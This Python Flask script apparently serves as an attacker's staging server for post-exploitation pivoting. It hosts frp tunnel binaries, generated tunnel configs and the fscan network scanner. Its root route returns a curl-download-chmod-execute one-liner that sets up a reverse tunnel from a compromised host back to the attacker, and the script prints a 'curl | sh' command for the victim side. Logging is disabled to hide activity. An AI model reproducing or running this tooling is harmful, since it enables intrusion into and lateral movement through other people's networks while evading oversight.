from flask import Flask, redirect, send_from_directory, g
import uuid
import socket
import sys
import logging
import os
import re

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
log.disabled = True
app.logger.disabled = True
app.logger.setLevel(logging.ERROR)
app.config['ENV'] = 'production'

def get_free_port():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('localhost', 0))
    _, port = sock.getsockname()
    sock.close()
    return port

PORT = 12345
IP = "1.1.1.1"
RESOURCE_PATH = "./tools/"
CACHE_PATH = "./caches/"
FRPCNAME = str(uuid.uuid4()) + ".ini"
FRPSNAME = str(uuid.uuid4()) + ".ini"
PROXYPORT = get_free_port()
FRPSPORT = get_free_port()

@app.route('/', methods=['GET'])
def root():
    # curl http://1.1.1.1:12345/frpc -o /tmp/frpc && 
    # curl http://1.1.1.1:12345/27e9a19b-7a5d-4700-91d8-c98d247e8a30.ini -o /tmp/frpc.ini && 
    # curl http://1.1.1.1:12345/fscan -o /tmp/fscan && 
    # chmod +x /tmp/frpc && chmod +x /tmp/fscan && 
    # /tmp/frpc -c /tmp/frpc.ini &
    replace(RESOURCE_PATH + "frpc.ini", CACHE_PATH + FRPCNAME, "{{vpsip}}", IP)
    replace(CACHE_PATH + FRPCNAME, CACHE_PATH + FRPCNAME, "{{proxyport}}", str(PROXYPORT))
    replace(CACHE_PATH + FRPCNAME, CACHE_PATH + FRPCNAME, "{{rand}}", str(uuid.uuid4()))
    replace(CACHE_PATH + FRPCNAME, CACHE_PATH + FRPCNAME, "{{frpsport}}", str(FRPSPORT))
    replace(RESOURCE_PATH + "frps.ini", CACHE_PATH + FRPSNAME, "{{frpsport}}", str(FRPSPORT))

    os.popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &")

    code = '''curl http://{IP}:{PORT}/frpc -o /tmp/frpc && 
    curl http://{IP}:{PORT}/frpcini -o /tmp/frpc.ini && 
    curl http://{IP}:{PORT}/fscan -o /tmp/fscan && 
    chmod +x /tmp/frpc && chmod +x /tmp/fscan && 
    /tmp/frpc -c /tmp/frpc.ini & '''.format(IP=IP, PORT=PORT)
    return code

@app.route('/frpc', methods=['GET'])
def frpc():
    return send_from_directory(RESOURCE_PATH, "frpc")

@app.route('/frpcini', methods=['GET'])
def frpcini():
    return send_from_directory(CACHE_PATH, FRPCNAME)

@app.route('/fscan', methods=['GET'])
def fscan():
    return send_from_directory(RESOURCE_PATH, "fscan")

def replace(inputfilename, outputfilename, before, after):
    with open(inputfilename, 'r') as f:
        content = f.read()
        f.close()
    content = content.replace(before, after)
    with open(outputfilename, 'w') as f:
        f.write(content)
        f.close()
    os.chmod(outputfilename, 0o777)

if __name__ == "__main__":
    # eg: python3 app.py 1.1.1.1 12345
    if len(sys.argv) != 3:
        print('eg: python3 app.py 1.1.1.1 12345')
        sys.exit()
    os.popen("chmod -R 777 .")
    IP = sys.argv[1]
    PORT = sys.argv[2]
    print("[+] curl http://{}:{} | sh".format(IP, PORT))
    app.run(host="0.0.0.0", port=PORT)
    